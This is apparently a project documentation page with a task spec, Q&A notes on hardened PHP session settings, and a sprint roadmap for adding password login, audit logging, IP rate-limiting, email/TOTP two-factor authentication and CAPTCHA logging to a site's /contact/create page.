Yandex SmartCaptcha for `formXXXXXXXX`
CSV error logging (`logErrorData`) → `form_errors_YYYY-MM.csv`
Successful-submission logging (`logFormData`) → `forms_log_YYYY-MM.csv`; however, this generic function writes only name/email/phone, so its row for `/contact/create` will be almost empty
Email notifications through PHPMailer (`sendEmails`)
A ready-made `response()` function for JSON responses to Tilda
What Needs to Be Done (Four Tasks)

1. Log Form Data and Its Transfer to Bitrix

Add a specialized logging function to the `formXXXXXXXX` case that writes the fields specific to this form: company, INN, KPP, OGRN, OKVED, address, IP, and date. Log the Bitrix response separately; `$response` is currently not written anywhere.

2. Two-Factor Authentication (Yandex ID / TOTP)

Create `/secure-area/` with the following files:

`config.php` — user list and settings
`users.json` — users with password hashes
`index.php` — login page (username + password)
`verify_2fa.php` — TOTP-code verification (Yandex Key)
`init.php` — session startup
Add a rule to `.htaccess` that runs the PHP session check before serving `pageZZZZZZZ.html`. The session lasts 30 days.

The administrator adds users manually to `users.json`. An `add_user.php` script is needed to generate password hashes.

3. Brute Force Protection + Notification

`checkRateLimit()` is already implemented and working; connect it to the `/secure-area/index.php` login page. When an IP is blocked, call `sendEmails()` to notify the appropriate address. The threshold is five attempts within ten minutes, followed by a 30-minute block. `forms.php` currently uses five attempts per hour, so the login page requires different parameters.

4. The `/contact/create` Page Remains in Place

The `pageZZZZZZZ.html` file remains untouched. Access is restricted through `.htaccess`: redirect to `/secure-area/index.php` if no session exists. Alternatively, use a PHP wrapper if `.htaccess` cannot check the session directly.

What Must Be Clarified or Obtained Before Starting

Form ID `formXXXXXXXX` has been confirmed; it is `/contact/create`
The Bitrix webhook exists in `company.php`, using `crm.company.add`
Yandex SmartCaptcha is already connected to this form
A list of users who should receive access is needed; the QA engineer will receive it later
Clarify which email address should receive blocking notifications
Clarify whether the server supports `session_start()` (PHP sessions); it most likely does
Deadlines

April 1, 15:00 — interim progress demonstration
April 3, 14:00 — fully working version on the test environment
April 8 — production release
##### 👤 Question

> “Sessions: Use native PHP sessions (`$_SESSION`) with hardened security settings”—what are these hardened security settings?

##### 💬 Answer · March 30

Good question. Here is what “hardened settings” usually means for PHP sessions:

Standard settings (insecure by default):

Out of the box, PHP stores sessions in `/tmp`, cookies live forever, the session ID is not renewed, and a session can be stolen through XSS or fixed by an attacker.

Hardened settings—the specific measures involved:

```php
// 1. Куки только по HTTPS
ini_set('session.cookie_secure', 1);

// 2. Куки недоступны через JavaScript (защита от XSS)
ini_set('session.cookie_httponly', 1);

// 3. Куки не передаются при кросс-сайтовых запросах (защита от CSRF)
ini_set('session.cookie_samesite', 'Strict');

// 4. Время жизни куки (30 дней как указано в задаче)
ini_set('session.cookie_lifetime', 60 * 60 * 24 * 30);

// 5. Обновлять ID сессии при входе (защита от session fixation)
session_regenerate_id(true);

// 6. Хранить сессии не в /tmp а в закрытой папке
session_save_path('/secure-area/sessions');

// 7. Проверять User-Agent и IP (чтобы угнанная сессия не работала)
if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_destroy();
    // редирект на логин
}
```

The most important measures are:

`httponly` and `secure` are mandatory; without them, a session can be stolen through JavaScript or over HTTP.

`session_regenerate_id` is mandatory on login; otherwise, session fixation attacks are possible.

`cookie_samesite` protects against CSRF and is worth enabling.

The rest is optional but adds another layer of protection.

##### 👤 Question

> How are sessions stored? Are they physical files, one for each user?

##### 💬 Answer · March 30

Yes, exactly. By default, PHP stores each session as a separate file on the server.

What this looks like physically:

```text
/tmp/
    sess_abc123def456    ← user 1 session
    sess_xyz789ghi012    ← user 2 session
    sess_qwe456rty789    ← user 3 session
```

The filename is the session ID. The same ID is stored in a cookie in the user's browser.

How it works:

```text
Browser                          Server
  │                                │
  │  Cookie: PHPSESSID=abc123  →   │  opens the sess_abc123 file
  │                                │  reads its data
  │  ←  responds to the request    │  $_SESSION['authenticated'] = true
```

What the session file contains:

```text
authenticated|b:1;username|s:5:"user";login_time|i:1700000000;
```

Simply serialized data from `$_SESSION`.

For our task, this means that with a 30-day session, the files will remain on the server for 30 days. There are few users, so there will be few files and no problem. If `session_save_path('/secure-area/sessions')` is specified, all session files will be kept in one controlled location rather than the shared `/tmp` directory, which other server processes can access.

##### 👤 Question

> Why does the technical specification describe sessions this way? What might it mean by:

`init.php` (sessions, users from a database or file, autoloading)

##### 💬 Answer · March 30

It most likely means that `init.php` is an initialization file included at the beginning of every PHP file in `/secure-area/`, where it performs three tasks:

1. Sessions — starts a session with hardened settings:

```php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
// и т.д.
session_start();
```

2. Users (database or file) — loads the user list from `users.json`:

```php
$users = json_decode(file_get_contents(__DIR__ . '/users.json'), true);
```

3. Autoloading — includes the required files and functions so they are available everywhere:

```php
require_once 'config.php';
require_once 'functions.php'; // проверка сессии, логирование и т.д.
```

Why this is needed:

So that the same code does not need to be repeated in every file (`index.php`, `verify_2fa.php`, and so on); instead, one line is placed at the beginning:

```php
require_once 'init.php';
// и всё уже готово
```

This is essentially a standard pattern: a single entry point that initializes everything the module needs to operate.

##### 👤 Question

> Does `company.php` return any response confirming that the data was sent? I am thinking about testing: if I change something on the page, how can I verify that I did not break the logic?

##### 💬 Answer · March 30

Yes. `company.php` receives the Bitrix response in `$response`, but does not use it in any way; it simply ignores it:

```php
$response = file_get_contents($finalUrl);
// всё, дальше ничего
```

What Bitrix returns:

On success:

```json
{"result":12345,"time":{"start":1234,"finish":1234}}
```

where `12345` is the ID of the company created in Bitrix.

On error:

```json
{"error":"ACCESS_DENIED","error_description":"Access denied!"}
```

How to test without breaking the logic:

The simplest approach is to temporarily make `company.php` write the response to a file:

```php
$response = file_get_contents($finalUrl);
file_put_contents(__DIR__ . '/bitrix_response.log', date('Y-m-d H:i:s') . ' ' . $response . "\n", FILE_APPEND);
```

Submit the form → open the server → inspect `bitrix_response.log` → see whether a company ID or an error was returned.

For comprehensive testing, the following setup is convenient:

Add a flag to `config.php`:

```php
define('DEBUG_MODE', true);
```

Then, in the relevant places:

```php
if (DEBUG_MODE) {
    file_put_contents('/tmp/debug.log', print_r($someVar, true));
}
```

Before deploying to production, simply change it to `false`, and all debug logging is disabled automatically.

#### Additions After the Call

+ Registration is manual through `users.json`.

+ It must be possible to determine exactly which user sent what, where, and when.

+ Email-based two-factor authentication as an alternative to Yandex ID.

+ If an attack is underway, record the IP somewhere.

+ If time permits, update the header and footer at the very end to match `pageYYYYYYY`.

:::

## 2. Sprint plan and sequence <Badge type="info" text="ROADMAP.md" />



::: details 🗺️ Open the full project roadmap

<div class="case-source-path"><span>Source</span><code>.tasks/done/000-auth-logs-2fa/ROADMAP.md</code></div>

#### ROADMAP — Securing the /contact/create page

| Parameter | Value |
|---|---|
| **Project** | Strengthening the security of the `https://example.com/contact/create` page |
| **Deadlines** | April 1 — interim demo \| April 3 — working version in the test environment \| April 8 — production |
| **Principle** | Each sprint is a self-contained enhancement that can be demonstrated and tested independently. |

##### Directory structure

```text
contact/
├── create.php         # ← renamed from create.html, with a session check at the beginning of the file
└── login/             # ← all authentication logic is located here
    ├── .htaccess
    ├── config.php
    ├── init.php
    ├── functions.php
    ├── index.php
    ├── logout.php
    ├── users.json
    ├── login_attempts.json
    ├── lib/
    ├── cli/
    ├── logs/
    └── sessions/
```

---

##### Sprint 1 — Password authentication (without 2FA)

> **Goal:** Protect the `/contact/create` page with basic authentication (username + password). After this sprint, anonymous access to the page is no longer possible.

###### Tasks

- ✅ **1.1** Create the `contact/login/` structure
  - `config.php` — configuration (file paths, 30-day session lifetime, debug flag)
  - `init.php` — initialization: hardened session settings (`cookie_httponly`, `cookie_secure`, `cookie_samesite`, `session_save_path`), session start, configuration loading
  - `users.json` — user file (`username`, `password_hash`, `role`, `2fa_enabled: false`).
  - `functions.php` — helper functions (authentication check, user retrieval, etc.)

- ✅ **1.2** Create the login page
  - `contact/login/index.php` — a minimalist username/password form. Use the template from `contact/login/login.html` (the working area is in the block with id="rec12345678).
  - Validate the username/password using `password_verify()` + the hash from `users.json`
  - On success: `$_SESSION['authenticated'] = true`, `$_SESSION['username']`, `session_regenerate_id(true)`, redirect to `/contact/create`
  - On error: display “Invalid username or password” (without specifying which value is incorrect)

- ✅ **1.3** Create `contact/login/logout.php`
  - Destroy the session (`session_destroy()`)
  - Redirect to the login page

- ✅ **1.4** Protect the `/contact/create` page
  - Rename `contact/create.html` → `contact/create.php`
  - Add the following at the beginning of the file (3 lines):
    ```php
    <?php
    require_once __DIR__ . '/login/init.php';
    if (!isset($_SESSION['authenticated'])) {
        header('Location: /contact/login/index.php');
        exit;
    }
    ?>
    ```
  - Update the rule in the root `.htaccess`: `/contact/create` now points to `contact/create.php`

- ✅ **1.5** Deny direct access to the `contact/login/` system files
  - `contact/login/.htaccess` — deny access to `users.json`, `config.php`, `sessions/`, `logs/`
  - Allow access only to `index.php`, `logout.php`

- ✅ **1.6** Create the `contact/login/sessions/` directory for session files

- ✅ **1.7** Connect the “Log out” button to the `logout.php` logic
  - The button is located in `contact/create.php` (navigation header, block `rec12345679`)
  - Current value: `href="#popup:download-buy"` — this is a 1990s pop-up; the link is incorrect
  - Replace it with: `href="/contact/login/logout.php"`
  - Leave the button's CSS styles unchanged (border + hover are already defined)

###### Note

Use `password_hash()` with bcrypt for passwords. During the first phase, passwords will be generated manually by the administrator.

###### Files

| Action       | File                                  |
|--------------|---------------------------------------|
| Create       | `contact/login/config.php`            |
| Create       | `contact/login/init.php`              |
| Create       | `contact/login/functions.php`         |
| Create       | `contact/login/users.json`            |
| Create       | `contact/login/index.php`             |
| Create       | `contact/login/logout.php`            |
| Create       | `contact/login/.htaccess`             |
| Create       | `contact/login/sessions/.gitkeep`     |
| Rename       | `contact/create.html` → `contact/create.php` |
| Modify       | `contact/create.php` (+session check at the beginning) |
| Modify       | `contact/create.php` (“Log out” button: `href` → `/contact/login/logout.php`) |
| Modify       | root `.htaccess`                      |


###### Definition of Done (DoD)

- ✅ Anonymous access to `/contact/create` is impossible — the user is redirected to the login page
- ✅ An authenticated user can view the page
- ✅ The session remains valid for 30 days
- ✅ Direct access to `users.json` and other system files is denied
- ✅ The “Log out” button in the page header calls `logout.php` and terminates the session

---

##### Sprint 2 — Authentication logging

> **Goal:** Record all login attempts (successful and unsuccessful) in a log file for auditing and debugging.

###### Tasks

- ✅ **2.1** Create the `contact/login/logs/` directory
  - Deny access through `.htaccess` (already completed in Sprint 1)

- ✅ **2.2** Implement the `logAuthAttempt()` function in `functions.php`
  - It writes the following to `contact/login/logs/auth.csv`:
    - Date and time (ISO 8601) in the Moscow time zone
    - Client IP address
    - User-Agent
    - Entered username
    - Result: `SUCCESS` / `FAIL_PASSWORD` / `FAIL_USER_NOT_FOUND` / `BLOCKED`
  - Format: structured CSV (one row = one attempt)

- ✅ **2.3** Integrate logging into `index.php`
  - Call `logAuthAttempt()` on every login attempt
  - Log both successful and unsuccessful login attempts

- ✅ **2.4** Log rotation
  - Split log files by month: `auth_2026-04.csv`

###### Files

| Action    | File                                  |
|-----------|---------------------------------------|
| Create    | `contact/login/logs/.gitkeep`         |
| Modify    | `contact/login/functions.php`         |
| Modify    | `contact/login/index.php`             |

###### Definition of Done (DoD)

- ✅ Every login attempt (success/failure) is recorded in `auth.csv`
- ✅ The log contains: time, IP, User-Agent, username, result
- ✅ The log file is inaccessible from the browser
- ✅ Logs are split by month

---

##### Sprint 3 — IP blocking after failed attempts

> **Goal:** Protect against brute-force attacks — if more than 5 failed attempts originate from one IP within 10 minutes, block the IP for 30 minutes and send an alert.

###### Tasks

- ✅ **3.1** Implement the `checkLoginRateLimit()` function in `functions.php`
  - Store attempt data in `contact/login/login_attempts.json`
  - Structure: `{ "IP": { "attempts": [...timestamps], "blocked_until": timestamp } }`
  - Threshold: 5 failed attempts within 600 seconds (10 minutes)
  - Block duration: 1800 seconds (30 minutes)
  - Move parameters to `config.php`

- ✅ **3.2** Integrate the check into `index.php`
  - Before verifying the password, check whether the IP is blocked
  - If it is blocked, display “Too many attempts; please try again later”
  - Increment the counter after a failed attempt

<!-- - [ ] **3.3** Block notification
  - When an IP is blocked, send an email notification (through the existing `sendEmails()` from `forms.php`)
  - Include in the email: IP, block time, number of attempts, usernames that were tried
  - Read the notification email address from `config.php` -->

- ✅ **3.4** Log blocks
  - Record the block event in `auth.csv` with the `BLOCKED` result
  - Record the IP in a separate list of attacking IPs, `logs/attacks.csv`, with more detailed data:
    - Block start date and time
    - Attacker IP address
    - User-Agent (for analyzing bots and scripts)
    - List of usernames that were tried (useful for determining whether the brute-force attack is targeted or uses a dictionary)
    - Total number of failed attempts before the block
    - Exact block end time
    - (Optional) Headers such as `X-Forwarded-For` or `Client-IP` to track the real IP behind a proxy
  - For the CSV data-saving logic, use the `csv-log-template.php` CSV creation template from the project root
  - CSV column headers must be short and descriptive

- ✅ **3.5** Automatically remove outdated records
  - During every check, remove records older than the block period from `login_attempts.json`
  - This prevents the file from growing indefinitely

###### Files

| Action    | File                                      |
|-----------|-------------------------------------------|
| Create    | `contact/login/login_attempts.json`       |
| Modify    | `contact/login/config.php`                |
| Modify    | `contact/login/functions.php`             |
| Modify    | `contact/login/index.php`                 |

###### Definition of Done (DoD)

- ✅ The IP is blocked after 5 failed attempts within 10 minutes
- ✅ A blocked IP cannot even submit the login form
- ✅ The block is removed automatically after 30 minutes (configured in `config.php`)
<!-- - ✅ When a block occurs, an email is sent to the specified address -->
- ✅ The block event is recorded in the log
- ✅ The `login_attempts.json` file does not grow indefinitely

---

##### Sprint 4 — Logging data submitted through the form

> **Goal:** Know exactly which authenticated user submitted which data to Bitrix24 and when.

###### Tasks

- ✅ **4.1** Create the `logCompanyFormData()` function in `company.php`
  - Log the extended fields of the `/contact/create` form:
    - Date and time
    - Authenticated user's name (from `$_SESSION['username']`)
    - IP address
    - Form data: company, inn, kpp, ogrn, okved, address, and all other fields
    - Bitrix24 response (`$response`) — the ID of the created company or an error
  - Format: CSV in `contact/login/logs/bitrix_data_YYYY-MM.csv` (use the `csv-log-template.php` template from the project root or an existing function based on it for writing)

- ✅ **4.2** Integrate logging into the `formXXXXXXXX` case in `forms.php`
  - Call `logCompanyFormData()` after `require 'bitrix/company.php'`
  - Pass `$_POST` and the `$response` from Bitrix

- ✅ **4.3** Pass user information to the form handler
  - In `contact/index.php` (the wrapper), pass the session data when including `create.php`
  - Alternatively, include `contact/login/init.php` in `forms.php` to read `$_SESSION['username']`
  - Ensure that the session is available in the form handler

###### Files

| Action    | File                                  |
|-----------|---------------------------------------|
| Modify    | `php/forms.php`                       |
| Modify    | `php/bitrix/company.php`              |
| Possibly  | `contact/login/init.php`              |

###### Definition of Done (DoD)

- ✅ Every `/contact/create` form submission is logged with complete data
- ✅ The log shows: who (username), when, what data, and the Bitrix response
- ✅ Log files are inaccessible from the browser
- ✅ Logging does not disrupt form operation

---

##### Sprint 4.1 — Unifying CSV logging in /contact

> **Goal:** Standardize all CSV logs within `/contact` on a single writing mechanism so that authentication, IP blocking, and form-submission logging use one shared secure function modeled on `csv-log-template.php`.

###### Tasks

- ✅ **4.1.1** Create a shared helper for CSV logs
  - File: `contact/login/lib/csv_logger.php`
  - Move the following into it:
    - safe sanitization of CSV values
    - opening the file in append mode
    - `flock(LOCK_EX)`
    - adding a BOM
    - writing the header when creating a new file
    - writing a row through `fputcsv(..., ';')`
    - monthly rotation using `*_YYYY-MM.csv`

- ✅ **4.1.2** Align value protection with the `csv-log-template.php` template
  - Use a consistent approach:
    - `trim`
    - removing `\r`, `\n`, `\t`
    - `htmlspecialchars(..., ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`
    - protection against CSV Injection for values beginning with `=`, `+`, `-`, `@`

- ✅ **4.1.3** Migrate authentication logging to the shared helper
  - `auth_YYYY-MM.csv`
  - `attacks_YYYY-MM.csv`
  - Preserve the current headers and row format

- ✅ **4.1.4** Migrate `/contact/create` form-data logging to the shared helper
  - `bitrix_data_YYYY-MM.csv`
  - Preserve the current columns

- ✅ **4.1.5** Do not mix business logic with low-level CSV writing
  - `contact/login/functions.php` and `php/bitrix/company.php` should only collect data
  - Low-level CSV writing must reside in one place

- Compatibility with current logs is not required because the solution has not yet been deployed to the production server.

###### Files

| Action    | File                                  |
|-----------|---------------------------------------|
| Create    | `contact/login/lib/csv_logger.php`    |
| Modify    | `contact/login/functions.php`         |
| Modify    | `php/bitrix/company.php`              |
| Possibly  | `php/forms.php`                       |

###### Definition of Done (DoD)

- ✅ All CSV logs within `/contact` are written through a single shared helper
- ✅ Value sanitization matches the protection level of `csv-log-template.php`
- ✅ `auth`, `attacks`, and `bitrix_data` preserve their current column structure
- ✅ The shared helper does not disrupt existing logging or monthly rotation

---

##### Sprint 5 — Email-based two-factor authentication (single-page)

> **Goal:** Add a second authentication factor using a one-time code sent by email. The code is sent to the address matching the user's username (no additional email field is required). All 2FA logic is implemented directly on the `index.php` page, without creating a separate page.
>
> **Note:** 2FA is optional and is enabled per user through `users.json`.

###### Architectural decision — a single expanding form

Instead of a separate `verify_2fa.php` page or switching screens, a single authentication form based on `index.php` is used. The username and password fields remain visible (readonly), while the 2FA field and timer appear below them.

###### Tasks

- ✅ **5.1** Extend `users.json` by adding the `2fa_enabled` field
  - Values: `false` (default), `true`
  - The user's username (`username`) **is their email address** — no separate email field is required
  - If `2fa_enabled: false`, the user logs in with a password only (as they do now)
  - Example record:
    ```json
    {
      "username": "user@example.com",
      "password_hash": "$2y$...",
      "role": "editor",
      "2fa_enabled": true
    }
    ```

- ✅ **5.2** Implement code generation and delivery by email
  - Create `contact/login/lib/email_code.php` with the following functions:
    - `generateEmailCode()` — generate a cryptographically secure random 6-digit code (`random_int(100000, 999999)`)
    - `sendLoginCode($email, $code)` — send the code through `PHPMailer` (already available in the project at `php/PHPMailer/`)
    - `storeEmailCode($code)` — store the code in `$_SESSION['2fa_email_code']` and `$_SESSION['2fa_email_code_time']`
    - `verifyEmailCode($inputCode)` — verify the code from the session while respecting its lifetime
  - Store the code in the session with a timestamp (lifetime is configured in `config.php`; default: 5 minutes)
  - Remove the code from the session after successful verification or expiration

- ✅ **5.3** Update POST processing in `index.php` by adding two scenarios
  - **Scenario A: initial form submission (username + password)**
    - After successfully verifying the password, check the 2FA flags:
      1. The global `2fa_global_enable` setting in `config.php`
      2. The user's `2fa_enabled` setting from `users.json`
      - If it is disabled globally (`false`) OR disabled for the user → immediately set `$_SESSION['authenticated'] = true` and redirect to `/contact/create`
      - If it is enabled globally (`true`) AND enabled for the user → do NOT set `authenticated = true`; instead:
        1. Set `$_SESSION['auth_step'] = '2fa_pending'`
        2. Set `$_SESSION['pending_username'] = $usernameValue`
        3. Set `$_SESSION['2fa_started_at'] = time()`
        4. Generate the code, store it in the session, and send it to `$usernameValue` (which is also the email address)
        5. Perform a PRG redirect to the same page (`$_SERVER['REQUEST_URI']`)
  - **Scenario B: form submission with a 2FA code** (when `$_SESSION['auth_step'] === '2fa_pending'`)
    - Detect it by the presence of the `2fa_code` POST field
    - Check the timeout: if more than N minutes have elapsed since `2fa_started_at`, reset the session and display “Time expired”
    - Verify the entered code through `verifyEmailCode()`
    - On success:
      1. `$_SESSION['authenticated'] = true`
      2. `$_SESSION['username'] = $_SESSION['pending_username']`
      3. Clear temporary 2FA data from the session
      4. Log `2FA_EMAIL_SUCCESS`
      5. Redirect to `/contact/create`
    - On error: log `2FA_EMAIL_FAIL` and display “Invalid code”
    - Track code-entry attempts (for example, a maximum of 5); reset the session if the limit is exceeded

- ✅ **5.4** Update the HTML portion of `index.php` by integrating the 2FA field into the shared form
  - Remove the logic that completely hides the “Username” and “Password” fields. In the `2fa_pending` state, the fields remain visible but become `readonly`.
  - Make the 2FA block appear below the “Password” field:
    ```php
    <?php if (isset($_SESSION['auth_step']) && $_SESSION['auth_step'] === '2fa_pending'): ?>
    <!-- 2FA code input, timer, and resend button -->
    <?php endif; ?>
    ```
  - The 2FA block contains:
    - Informational text: “A code has been sent to your email”
    - A 6-digit code input (`name="2fa_code"`, `inputmode="numeric"`, `maxlength="6"`, `autocomplete="one-time-code"`)
    - A countdown timer until resending becomes available (implemented in JS)
    - A “Resend code” button/link (via POST submission). The button must be disabled (`disabled`) and enabled by the JS script only after the timer expires
    - A “Change login details” link that resets `auth_step` and displays the active form again

- ✅ **5.5** Implement code resending
  - Use the POST field `action=resend_code` when `auth_step === '2fa_pending'`
  - Rate limit: no more than once every 60 seconds (store `$_SESSION['2fa_last_resend']`)
  - On resend, generate a new code that replaces the previous one
  - Log `2FA_EMAIL_RESENT`

- ✅ **5.6** Protect the intermediate session
  - On `/contact/create`, verify that `auth_step` is not `2fa_pending`; otherwise, redirect back to `/contact/login/`
  - Apply an overall timeout to the entire 2FA process (for example, 10 minutes from `2fa_started_at`); completely reset the session on expiration
  - When opening `index.php` with an expired `2fa_pending` state, reset it automatically and display the login form

- ✅ **5.7** Add 2FA settings to `config.php`
  - `2fa_global_enable` — global switch (default: `true`). If `false`, 2FA is completely disabled for all users (overrides `users.json`).
  - `2fa_code_lifetime` — one-time code lifetime in seconds (default: 300 = 5 minutes)
  - `2fa_session_timeout` — overall timeout for the 2FA process (default: 600 = 10 minutes)
  - `2fa_max_attempts` — maximum number of code-entry attempts (default: 5)
  - `2fa_resend_cooldown` — minimum interval between resends (default: 60 seconds)
  - `2fa_email_subject` — email subject (default: “Login verification code”)

- ✅ **5.8** Log 2FA events
  - Add the following records to `auth.csv`:
    - `2FA_EMAIL_SENT` — code sent by email
    - `2FA_EMAIL_RESENT` — code resent
    - `2FA_EMAIL_SUCCESS` — code accepted; authentication completed
    - `2FA_EMAIL_FAIL` — invalid code
    - `2FA_TIMEOUT` — code-entry timeout expired
    - `2FA_MAX_ATTEMPTS` — code-entry attempt limit exceeded

###### Files

| Action    | File                                  |
|-----------|---------------------------------------|
| Create    | `contact/login/lib/email_code.php`    |
| Modify    | `contact/login/users.json`            |
| Modify    | `contact/login/index.php`             |
| Modify    | `contact/login/functions.php`         |
| Modify    | `contact/login/config.php`            |
| Modify    | `contact/create.php` (stronger check — block `2fa_pending`) |

###### Definition of Done (DoD)

- ✅ Global disablement: when `2fa_global_enable = false` in `config.php`, no user goes through 2FA.
- ✅ When global 2FA is enabled, a user with `2fa_enabled: true` receives a code at their username (email) after entering the password (add a comment that 2FA must also be enabled for users in user.json).
- ✅ A user with personal 2FA disabled logs in with a password only (as before).
- ✅ The code remains valid for 5 minutes and then expires (configured in `config.php`)
- ✅ Resending is limited (once per minute)
- ✅ The 2FA code input appears directly below the password field in the single form (with a timer and resend button)
- ✅ The intermediate session (`2fa_pending`) does not grant access to the protected page
- ✅ All 2FA events are logged

---

##### Sprint 5.1 — Two-factor authentication (TOTP / Yandex Key) (Optional)

> **Goal:** Add an alternative 2FA method through a TOTP application (Yandex Key, Google Authenticator, etc.). This extends the mechanism created in Sprint 5.
>
> **Note:** The implementation reuses the expanding-form logic from Sprint 5 — the TOTP code field appears in the same `index.php` form directly below the password.

###### Tasks

- ⬜ **5.1.1** Add TOTP support
  - Implement TOTP code generation/verification (RFC 6238)
  - Use a simple standalone library (one file) or implement it directly — the algorithm is standardized
  - Do not add Composer dependencies; place the files in `contact/login/lib/`

- ⬜ **5.1.2** Extend `users.json`
  - Add `"totp"` to the allowed values of the `2fa_method` field (now: `"none"`, `"email"`, `"totp"`)
  - Add the `2fa_secret: "EXAMPLE_BASE32_SECRET"` field (used only when `2fa_method: "totp"`)
  - Example record:
    ```json
    {
      "username": "admin@example.com",
      "password_hash": "$2y$...",
      "role": "admin",
      "2fa_method": "totp",
      "2fa_secret": "EXAMPLE_TOTP_SECRET"
    }
    ```

- ⬜ **5.1.3** Update POST processing in `index.php`
  - In Scenario A (after successfully verifying the password), add a `2fa_method === "totp"` branch:
    1. Set `$_SESSION['auth_step'] = '2fa_pending'`
    2. Set `$_SESSION['2fa_method'] = 'totp'`
    3. Do NOT send an email and do NOT generate a code in the session
    4. Perform a PRG redirect to the same page
  - In Scenario B (2FA code verification), branch on `$_SESSION['2fa_method']`:
    - `"email"` → verify the code from the session (already implemented in Sprint 5)
    - `"totp"` → verify the code with the TOTP algorithm using `2fa_secret` from `users.json`

- ⬜ **5.1.4** Update the HTML portion of `index.php`
  - Adapt the informational text in the displayed 2FA block:
    - For `email`: “A code has been sent to your email”
    - For `totp`: “Enter the code from the application”
  - Hide the “Resend code” button for the `totp` method (not applicable)

- ⬜ **5.1.5** Log TOTP events
  - Add the following records to `auth.csv`: `2FA_TOTP_SUCCESS`, `2FA_TOTP_FAIL`

###### Files

| Action    | File                                  |
|-----------|---------------------------------------|
| Create    | `contact/login/lib/totp.php`          |
| Modify    | `contact/login/users.json`            |
| Modify    | `contact/login/index.php`             |
| Modify    | `contact/login/functions.php`         |

###### Definition of Done (DoD)

- ✅ A user with `2fa_method: "totp"` must enter a TOTP code after the password
- ✅ Codes from Yandex Key / Google Authenticator are accepted correctly
- ✅ Both 2FA methods (`email` and `totp`) operate concurrently through a single interface
- ✅ The intermediate session does not grant access to the protected page
- ✅ All TOTP 2FA events are logged

---

##### Sprint 6 — Integrating Yandex SmartCaptcha into the authentication form

The submission form already used CAPTCHA; it can be moved to authentication to make automated attacks more difficult.

##### Sprint 6.1 — Logging CAPTCHA failures and recording the attacking IP

> **Goal:** Ensure that login attempts rejected before password verification due to missing or invalid Yandex SmartCaptcha are not omitted from the audit. These attempts must be recorded in `auth.csv`, count toward the rate limit, and automatically create a record in `attacks.csv` when the threshold is reached.

###### Tasks

- ✅ **6.1.1** Log all unsuccessful CAPTCHA-related attempts
  - Introduce separate result statuses for an empty `smart-token`, an invalid token, and a verification error, such as `FAIL_CAPTCHA_MISSING` and `FAIL_CAPTCHA_INVALID`
  - Store the IP address, User-Agent, and entered username in `auth.csv`
  - Do not disclose to the user exactly what failed; the message must remain generic

- ✅ **6.1.2** Include CAPTCHA failures in the existing rate limit
  - A failure at the CAPTCHA stage must count as a full failed login attempt
  - When the block threshold is reached, the IP must be classified as an attacker just as it is after a password failure

- ✅ **6.1.3** Ensure the attacking IP is recorded in `attacks.csv`
  - On the first CAPTCHA-related block, record the date and time, IP, User-Agent, list of usernames, and block end time
  - Prevent duplicate records on subsequent requests from an already blocked IP

- ✅ **6.1.4** Verify behavior during an automated attack
  - A series of requests without CAPTCHA must not bypass protection or be omitted from the audit
  - After being blocked, the IP must remain in the attack log until it is automatically unblocked

###### Files

| Action    | File                         |
|-----------|------------------------------|
| Modify    | `contact/login/index.php`    |
| Modify    | `contact/login/functions.php` |

###### Definition of Done (DoD)

- ✅ Login attempts without CAPTCHA or with an invalid CAPTCHA are recorded in `auth.csv`
- ✅ A CAPTCHA failure increments the failed-attempt counter
- ✅ After the threshold is reached, the IP is blocked and recorded in `attacks.csv`
- ✅ A blocked IP remains included in the audit on subsequent requests
- ✅ The user sees a generic error message that does not disclose the cause

##### Sprint 7 — Complete isolation of the solution in the contact directory

> **Goal:** Make the `contact/` directory a completely self-contained module that can be moved in its entirety to any server without depending on `php/`. All logic for processing the `formXXXXXXXX` form, sending email notifications, interacting with Bitrix24, and logging must reside inside `contact/` and use its own copies of libraries.
> **Constraint:** **Only** the `formXXXXXXXX` case (the `/contact/create` form) is affected. All other ~25 site forms continue to operate through `php/forms.php` unchanged.

###### Architectural decision

Currently, the `contact/create.php` form sends POST requests to `/procces/`, which is handled by the global `php/forms.php` router. Within `forms.php`, the `formXXXXXXXX` case uses:

1. **`sendEmails()`** — a function from `php/forms.php` that uses `php/PHPMailer/`
2. **`php/bitrix/company.php`** — constructs a request to the Bitrix REST API
3. **`logCompanyFormData()`** — from `company.php`; it already writes to `contact/login/logs/`
4. **`logFormData()`** — shared CSV logging from `php/forms.php`
5. **`sanitizeInput()`, `detectInjection()`, `validateFields()`, `checkRateLimit()`** — security functions from `php/forms.php`
6. **`initContactCreateAuthSession()`** — authentication check (references `contact/login/init.php`)
7. **`sanitizeCsvValue()`, `logErrorData()`, `getRealIp()`** — helper functions

After Sprint 10, this entire chain will reside inside `contact/` and be served by its own `contact/process.php` handler.

###### Tasks

- ✅ **7.1** Copy the PHPMailer library to `contact/login/lib/PHPMailer/`
  - Copy three files from `php/PHPMailer/`:
    - `PHPMailer.php`
    - `SMTP.php`
    - `Exception.php`
  - Path: `contact/login/lib/PHPMailer/`
  - **Pitfall:** `email_code.php` (Sprint 5) already contains `require` statements for `php/PHPMailer/`. After copying, update these `require` statements to the local path `__DIR__ . '/PHPMailer/...'`
  - The other 4 files from `php/PHPMailer/` (`DSNConfigurator.php`, `OAuth.php`, `OAuthTokenProvider.php`, `POP3.php`) are **not needed** — the project uses only the basic SMTP transport

- ✅ **7.2** Update PHPMailer paths in `email_code.php`
  - Replace:
    ```php
    require_once dirname(__DIR__, 3) . '/php/PHPMailer/PHPMailer.php';
    require_once dirname(__DIR__, 3) . '/php/PHPMailer/SMTP.php';
    require_once dirname(__DIR__, 3) . '/php/PHPMailer/Exception.php';
    ```
  - With:
    ```php
    require_once __DIR__ . '/PHPMailer/PHPMailer.php';
    require_once __DIR__ . '/PHPMailer/SMTP.php';
    require_once __DIR__ . '/PHPMailer/Exception.php';
    ```
  - After this change, the email 2FA module no longer depends on `php/`

- ✅ **7.3** Move the SMTP configuration to `config.php`
  - Add an SMTP section to `contact/login/config.php`:
    ```php
    // SMTP settings for all email messages sent by the contact module (2FA + form notifications)
    'smtp_host'     => 'smtp.example.com',
    'smtp_port'     => 587,
    'smtp_secure'   => 'tls',
    'smtp_auth'     => true,
    'smtp_username' => 'notify@example.com',
    'smtp_password' => 'password',
    'smtp_from'     => 'notify@example.com',
    'smtp_from_name'=> 'example.com website',
    ```
